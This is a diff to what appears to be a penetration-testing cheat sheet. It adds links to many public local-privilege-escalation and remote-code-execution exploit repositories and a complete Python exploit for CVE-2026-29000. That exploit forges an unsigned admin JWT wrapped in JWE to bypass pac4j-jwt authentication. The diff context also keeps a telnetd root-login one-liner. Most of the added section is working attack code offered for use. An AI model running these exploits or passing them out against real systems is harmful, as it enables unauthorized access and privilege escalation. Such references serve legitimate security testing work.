@@ -48,6 +48,7 @@
 - [CVE-2025-55182: React2Shell RCE](#cve-2025-55182-react2shell-rce)
 - [CVE-2025-9074: Docker API Unauthorized Access RCE](#cve-2025-9074-docker-api-unauthorized-access-rce)
 - [CVE-2026-24061: GNU Inetutils telnetd RCE](#cve-2026-24061-gnu-inetutils-telnetd-rce)
+- [CVE-2026-29000: Authentication Bypass in pac4j-jwt 6.0.3 JwtAuthenticator](#cve-2026-29000-authentication-bypass-in-pac4j-jwt-603-jwtauthenticator)
 - [BadSuccessor Delegated Managed Service Account (dMSA) LPE](#badsuccessor-delegated-managed-service-account-dmsa-lpe)
 - [GodPotato LPE](#godpotato-lpe)
 - [Juicy Potato LPE](#juicy-potato-lpe)
@@ -210,14 +211,48 @@
 | CVE-2025-5777 | Citrix Bleed 2 | https://github.com/bughuntar/CVE-2025-5777 |
 | CVE-2025-62215 | Windows Kernel LPE | https://github.com/dexterm300/CVE-2025-62215-exploit-poc |
 | CVE-2025-9074 | Docker Desktop (Windows) Container Escape - Host Write via Exposed Engine API | https://github.com/zenzue/CVE-2025-9074 |
+| CVE-2026-20817 | Windows Error Reporting ALPC LPE | https://github.com/oxfemale/CVE-2026-20817 |
 | CVE-2026-24061 | GNU Inetutils telnetd RCE | https://github.com/SafeBreach-Labs/CVE-2026-24061 |
+| CVE-2026-26128 | Windows SMB Server Improper Authentication LPE | https://github.com/jarnovandenbrink/CVE-2026-26128 |
+| CVE-2026-31431 | Copy Fail LPE (1) | https://github.com/theori-io/copy-fail-CVE-2026-31431 |
+| CVE-2026-31431 | Copy Fail LPE (2) | https://github.com/painoob/Copy-Fail-Exploit-CVE-2026-31431 |
+| CVE-2026-31635 | DirtyDecrypt / DirtyCBC LPE | https://github.com/v12-security/pocs/tree/main/dirtydecrypt |
+| CVE-2026-42945 | NGINX Rift RCE | https://github.com/DepthFirstDisclosures/Nginx-Rift |
+| CVE-2026-46300 | Fragnesia Universal Linux LPE | https://github.com/v12-security/pocs/blob/main/fragnesia%2FREADME.md |
+
+### Miscellaneous Exploits
+
+| CVE | Descritpion | URL |
+| --- | --- | --- |
 | n/a | BadSuccessor LPE | https://github.com/ibaiC/BadSuccessor |
+| n/a | BlueHammer LPE (1) | https://github.com/Nightmare-Eclipse/BlueHammer |
+| n/a | BlueHammer LPE (2) | https://github.com/0xjustBen/BlueHammer |
+| n/a | Dirty Frag Universal Linux LPE | https://github.com/V4bel/dirtyfrag |
 | n/a | dompdf RCE (0-day) | https://github.com/positive-security/dompdf-rce |
 | n/a | dompdf XSS to RCE (0-day) | https://positive.security/blog/dompdf-rce |
 | n/a | GSM Linux Kernel LPE (1) | https://github.com/jmpe4x/GSM_Linux_Kernel_LPE_Nday_Exploit |
 | n/a | GSM Linux Kernel LPE (2) | https://github.com/YuriiCrimson/ExploitGSM |
+| n/a | GreenPlasma Windows CTFMON Arbitrary Section Creation LPE | https://github.com/Nightmare-Eclipse/GreenPlasma |
+| n/a | Microsoft ms-photos URI NTLM Leak (0-day) | https://github.com/rubenformation/ms-photos_NTLM_Leak |
+| n/a | MiniPlasma CVE-2020-17103 partially patched cldflt.sys LPE | https://github.com/Nightmare-Eclipse/MiniPlasma |
+| n/a | NoFilter LPE | https://github.com/deepinstinct/NoFilter |
+| n/a | OfflineSAM LPE | https://github.com/gtworek/PSBits/tree/master/OfflineSAM |
+| n/a | OfflineAddAdmin2 LPE | https://github.com/gtworek/PSBits/tree/master/OfflineSAM/OfflineAddAdmin2 |
+| n/a | PrintSpoofer LPE (1) | https://github.com/dievus/printspoofer |
+| n/a | PrintSpoofer LPE (2) | https://github.com/itm4n/PrintSpoofer |
+| n/a | RedSun LPE | https://github.com/Nightmare-Eclipse/RedSun |
+| n/a | SharpSuccessor LPE | https://github.com/logangoins/SharpSuccessor |
+| n/a | Shocker Container Escape | https://github.com/gabrtv/shocker |
+| n/a | ssh-keysign-pwn | https://github.com/0xdeadbeefnetwork/ssh-keysign-pwn |
 | n/a | StorSvc LPE | https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc |
-| n/a | ADCSCoercePotato | https://github.com/decoder-it/ADCSCoercePotato |
+| n/a | SystemNightmare LPE | https://github.com/GossiTheDog/SystemNightmare |
+| n/a | YellowKey Bitlocker Bypass | https://github.com/Nightmare-Eclipse/YellowKey |
+
+### Vegetable Exploits
+
+| CVE | Descritpion | URL |
+| --- | --- | --- |
+| n/a | ADCSCoercePotato LPE | https://github.com/decoder-it/ADCSCoercePotato |
 | n/a | CoercedPotato LPE | https://github.com/Prepouce/CoercedPotato |
 | n/a | DCOMPotato LPE | https://github.com/zcgonvh/DCOMPotato |
 | n/a | DeadPotato LPE | https://github.com/lypd0/DeadPotato |
@@ -225,29 +260,25 @@
 | n/a | GodPotato LPE | https://github.com/BeichenDream/GodPotato |
 | n/a | JuicyPotato LPE | https://github.com/ohpe/juicy-potato |
 | n/a | Juice-PotatoNG LPE | https://github.com/antonioCoco/JuicyPotatoNG |
-| n/a | Microsoft ms-photos URI NTLM Leak (0-day) | https://github.com/rubenformation/ms-photos_NTLM_Leak |
 | n/a | MultiPotato LPE | https://github.com/S3cur3Th1sSh1t/MultiPotato |
 | n/a | RemotePotato0 LPE | https://github.com/antonioCoco/RemotePotato0 |
 | n/a | RoguePotato LPE | https://github.com/antonioCoco/RoguePotato |
 | n/a | RottenPotatoNG LPE | https://github.com/breenmachine/RottenPotatoNG |
 | n/a | RustPotato LPE | https://github.com/safedv/RustPotato |
+| n/a | S4UTomato LPE | https://github.com/wh0amitz/S4UTomato |
 | n/a | SharpEfsPotato LPE | https://github.com/bugch3ck/SharpEfsPotato |
-| n/a | SharpSuccessor LPE | https://github.com/logangoins/SharpSuccessor |
 | n/a | SigmaPotato LPE | https://github.com/tylerdotrar/SigmaPotato |
 | n/a | SweetPotato LPE | https://github.com/CCob/SweetPotato |
 | n/a | SweetPotato LPE | https://github.com/uknowsec/SweetPotato |
-| n/a | S4UTomato LPE | https://github.com/wh0amitz/S4UTomato |
-| n/a | PrintSpoofer LPE (1) | https://github.com/dievus/printspoofer |
-| n/a | PrintSpoofer LPE (2) | https://github.com/itm4n/PrintSpoofer |
-| n/a | Shocker Container Escape | https://github.com/gabrtv/shocker |
-| n/a | SystemNightmare LPE | https://github.com/GossiTheDog/SystemNightmare |
-| n/a | NoFilter LPE | https://github.com/deepinstinct/NoFilter |
-| n/a | OfflineSAM LPE | https://github.com/gtworek/PSBits/tree/master/OfflineSAM |
-| n/a | OfflineAddAdmin2 LPE | https://github.com/gtworek/PSBits/tree/master/OfflineSAM/OfflineAddAdmin2 |
+
+### Exploit Collections
+
+| CVE | Descritpion | URL |
+| --- | --- | --- |
 | n/a | bin-sploits | https://gitlab.com/exploit-database/exploitdb-bin-sploits |
 | n/a | Kernelhub | https://github.com/Ascotbe/Kernelhub |
-| n/a | Windows Exploits | https://github.com/SecWiki/windows-kernel-exploits |
 | n/a | Pre-compiled Windows Exploits | https://github.com/abatchy17/WindowsExploits |
+| n/a | Windows Exploits | https://github.com/SecWiki/windows-kernel-exploits |
 
 ## CVE-2005-4890: TTY Hijacking / TTY Input Pushback via TIOCSTI
 
@@ -2320,6 +2351,71 @@ $ sudo /etc/init.d/inetutils-inetd start
 
 ```console
 $ USER="-f root" telnet -a localhost
+```
+## CVE-2026-29000: Authentication Bypass in pac4j-jwt 6.0.3 JwtAuthenticator
+
+```python
+#!/usr/bin/env python3
+# CVE-2026-29000 — pac4j-jwt 6.0.3 Authentication Bypass
+# JwtAuthenticator accepts PlainJWT wrapped in JWE, skipping signature validation
+
+import json, time, base64, sys
+import requests
+from jwcrypto import jwk, jwe
+
+def b64url(data: bytes) -> str:
+    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
+
+def fetch_pubkey(target: str) -> tuple[jwk.JWK, str]:
+    r = requests.get(f"{target}/api/auth/jwks", timeout=10)
+    r.raise_for_status()
+    key_data = r.json()["keys"][0]
+    return jwk.JWK(**key_data), key_data["kid"]
+
+def forge_plain_jwt(sub: str = "admin", role: str = "ROLE_ADMIN") -> str:
+    now = int(time.time())
+    header  = b64url(json.dumps({"alg": "none"}).encode())
+    payload = b64url(json.dumps({
+        "sub": sub, "role": role,
+        "iss": "principal-platform",
+        "iat": now, "exp": now + 3600
+    }).encode())
+    return f"{header}.{payload}."
+
+def wrap_jwe(plain_jwt: str, pub_key: jwk.JWK, kid: str) -> str:
+    token = jwe.JWE(
+        plain_jwt.encode(),
+        recipient=pub_key,
+        protected=json.dumps({
+            "alg": "RSA-OAEP-256",
+            "enc": "A128GCM",
+            "kid": kid,
+            "cty": "JWT"
+        })
+    )
+    return token.serialize(compact=True)
+
+def exploit(target: str) -> None:
+    pub_key, kid = fetch_pubkey(target)
+    plain_jwt    = forge_plain_jwt()
+    forged_token = wrap_jwe(plain_jwt, pub_key, kid)
+
+    r = requests.get(
+        f"{target}/api/dashboard",
+        headers={"Authorization": f"Bearer {forged_token}"},
+        timeout=10
+    )
+    r.raise_for_status()
+    user = r.json()["user"]
+
+    print(f"[+] {user['username']} ({user['role']}) — HTTP {r.status_code}")
+    print(f"[+] {forged_token}")
+
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print(f"Usage: {sys.argv[0]} <target>")
+        sys.exit(1)
+    exploit(sys.argv[1])
 ```
 
 ## BadSuccessor Delegated Managed Service Account (dMSA) LPE
